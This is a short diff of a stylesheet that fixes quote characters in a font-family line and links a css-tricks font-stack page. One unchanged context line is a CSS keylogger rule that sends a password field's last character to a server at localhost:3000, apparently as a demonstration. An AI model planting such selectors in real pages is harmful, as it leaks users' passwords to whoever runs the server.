@@ -19,7 +19,7 @@
 input[type="password"][value$="A"] { background-image: url("http://localhost:3000/A"); }
 
 body { 
-  font-family: -apple-system, BlinkMacSystemFont, “Segoe UI”, Roboto, Helvetica, Arial, sans-serif;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
 }
 ```
  * https://css-tricks.com/snippets/css/font-stacks/
